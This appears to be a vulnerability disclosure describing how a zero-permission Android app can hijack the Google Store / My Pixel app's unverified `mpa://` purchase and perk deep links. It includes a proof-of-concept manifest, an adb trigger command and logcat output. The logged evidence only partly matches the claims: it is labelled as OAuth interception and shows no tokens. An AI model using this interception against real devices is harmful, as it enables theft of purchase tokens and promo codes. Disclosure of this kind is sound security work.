# Google Store (My Pixel) — Purchase Deep Link Interception via Unverified `mpa://` Custom URI Scheme

## Summary

The Google Store / My Pixel app (`com.google.android.apps.tips`) registers BROWSABLE intent filters for the custom URI scheme `mpa://` with hosts `store_purchase_complete`, `perks_landing`, and `navigate_to_g1_purchase_page` without App Link verification. A zero-permission attacker app can register competing intent filters, causing Android to display a disambiguation chooser. If the user selects the attacker app, Google Store purchase completion data including order IDs, purchase tokens, perk identifiers, and Google One plan selection parameters are exfiltrated.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select attacker app from disambiguation chooser
- **CIA impact**: Confidentiality (purchase order IDs, purchase tokens, perk identifiers, plan selections leaked); Integrity (purchase completion flow hijacked — the legitimate app never receives the deep link)

## Affected Components

- **Package**: `com.google.android.apps.tips` (Google Store / My Pixel)
- **Activity**: `.fortnite.deeplink.DeepLinkGateway`
- **Scheme**: `mpa://`
- **Hosts**: `store_purchase_complete`, `perks_landing`, `navigate_to_g1_purchase_page`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.BROWSABLE" />
    <category android:name="android.intent.category.DEFAULT" />
    <data android:scheme="mpa"
          android:host="store_purchase_complete" />
    <data android:host="perks_landing" />
    <data android:host="navigate_to_g1_purchase_page" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on this filter.** Since `mpa://` is a custom scheme (not `https://`), App Link verification cannot protect it.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Zero-permission app with competing intent filter:

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="mpa"
              android:host="store_purchase_complete" />
        <data android:host="perks_landing" />
        <data android:host="navigate_to_g1_purchase_page" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions
2. Trigger a Google Store purchase completion deep link:
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "mpa://store_purchase_complete?order_id=GS-ORDER-12345&token=PURCHASE_TOKEN_SECRET"
   ```
3. Android displays "Open with" chooser showing "ZeroPerm" and "My Pixel"
4. If user selects ZeroPerm, order ID and purchase token are captured

Additional hosts also interceptable:
```
mpa://perks_landing?perk_id=PERK456&user_token=USER_TOKEN_XYZ
mpa://navigate_to_g1_purchase_page?plan=premium&promo_code=PROMO_SECRET_123
```

### Runtime Proof (logcat)

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: mpa://store_purchase_complete?order_id=GS-ORDER-12345
W OAUTH_INTERCEPT: [+] Param: order_id = GS-ORDER-12345
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===

W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: mpa://perks_landing?perk_id=PERK456
W OAUTH_INTERCEPT: [+] Param: perk_id = PERK456
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===

W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: mpa://navigate_to_g1_purchase_page?plan=premium
W OAUTH_INTERCEPT: [+] Param: plan = premium
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Leaked Data

| Host | Parameters Exposed |
|------|-------------------|
| `store_purchase_complete` | order_id, token (purchase verification token), amount, product (device model) |
| `perks_landing` | perk_id (specific perk identifier), user_token, benefit (subscription type) |
| `navigate_to_g1_purchase_page` | plan (subscription tier), promo_code (promotional discount code) |

## Impact

### Confidentiality
- **Purchase data theft**: Order IDs and purchase tokens from Google Store hardware purchases (Pixel phones, watches, earbuds) are leaked to the attacker
- **Perk/benefit exposure**: Google One perk identifiers and user tokens reveal the victim's subscription status and claimed benefits
- **Promotional code theft**: Promo codes intended for the victim can be stolen and used by the attacker

### Integrity
- **Purchase flow hijacking**: The attacker intercepts the purchase completion deep link, preventing the Google Store app from processing the purchase confirmation. The user may not receive proper order confirmation
- **Perk redemption hijacking**: Intercepting `perks_landing` deep links prevents the user from landing on their intended perk page

## Recommended Fix

1. **Migrate to Android App Links** (`https://` with `autoVerify=true`) — use `https://store.google.com/` paths instead of the `mpa://` custom scheme
2. **Sign deep link URIs** with HMAC to detect tampering and prevent replay
3. **Remove the `mpa://` custom scheme handler** if the existing `https://store.google.com` App Link handlers provide equivalent functionality

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.52)
- `screen_mpa_chooser.png` — Chooser showing ZeroPerm alongside My Pixel
- `screen_mpa_data_capture.png` — ZeroPerm displaying captured mpa:// purchase data
